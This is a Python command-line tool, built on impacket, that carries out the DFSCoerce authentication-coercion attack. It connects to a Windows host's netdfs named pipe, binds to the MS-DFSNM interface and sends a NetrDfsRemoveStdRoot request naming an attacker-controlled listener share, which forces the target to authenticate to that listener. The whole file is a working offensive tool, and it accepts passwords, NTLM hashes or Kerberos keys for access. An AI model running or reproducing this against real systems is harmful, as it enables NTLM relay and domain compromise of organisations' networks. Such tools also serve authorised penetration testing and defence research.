import sys
import logging
import argparse

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin
from impacket.examples.utils import parse_target

from dfscoerce.packets import *
from dfscoerce.constants import *


def main():
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(
        add_help=True, description="Authentication coercion using MS-DFSNM NetrDfsRemoveStdRoot"
    )

    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<targetName or address>",
    )
    parser.add_argument(
        "listener", action="store", help="e.g. \\\\attacker\\share"
    )
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    group = parser.add_argument_group("authentication")

    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication " "(128 or 256 bits)",
    )

    group = parser.add_argument_group("connection")

    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in "
        "the target parameter",
    )
    group.add_argument(
        "-target-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the target machine. If omitted it will use whatever was specified as target. "
        "This is useful when target is the NetBIOS name and you cannot resolve it",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ""

    if (
        password == ""
        and username != ""
        and options.hashes is None
        and options.no_pass is False
        and options.aesKey is None
    ):
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(":")
    else:
        lmhash = ""
        nthash = ""

    # Connect to DFS service via DCERPC
    rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % options.target_ip)
    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

    if options.k:
        rpctransport.set_kerberos(options.k, kdcHost=options.dc_ip)
    if options.target_ip:
        rpctransport.setRemoteHost(options.target_ip)
    
    dce = rpctransport.get_dce_rpc()
    logging.info("Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % options.target_ip)
    
    try:
        dce.connect()
    except Exception as e:
        logging.error("Connection failed: %s" % str(e))
        sys.exit(1)

    try:
        dce.bind(uuidtup_to_bin((DFS_INTERFACE_UUID, '3.0')))
    except Exception as e:
        logging.error("Bind failed: %s" % str(e))
        dce.disconnect()
        sys.exit(1)
    
    logging.info("Successfully bound to DFS interface!")

    # Send the coercion request
    try:
        request = NetrDfsRemoveStdRoot()
        request['ServerName'] = '%s\x00' % options.listener
        request['RootShare'] = 'test\x00'
        request['ApiFlags'] = 1
        
        logging.info("Sending NetrDfsRemoveStdRoot request with ServerName: %s" % options.listener)
        
        # Print the marshaled request for reflection
        marshal_data = request.getData()
        logging.info("Request marshaled data (%d bytes): %s" % (len(marshal_data), marshal_data.hex()))
        
        resp = dce.request(request)
        
        # Print the response data for reflection
        if hasattr(resp, 'getData'):
            response_data = resp.getData()
            logging.info("Response marshaled data (%d bytes): %s" % (len(response_data), response_data.hex()))
        
        logging.info("DFS coercion request sent successfully!")
        
    except Exception as e:
        logging.error("Request failed: %s" % str(e))
    finally:
        dce.disconnect()


if __name__ == "__main__":
    main()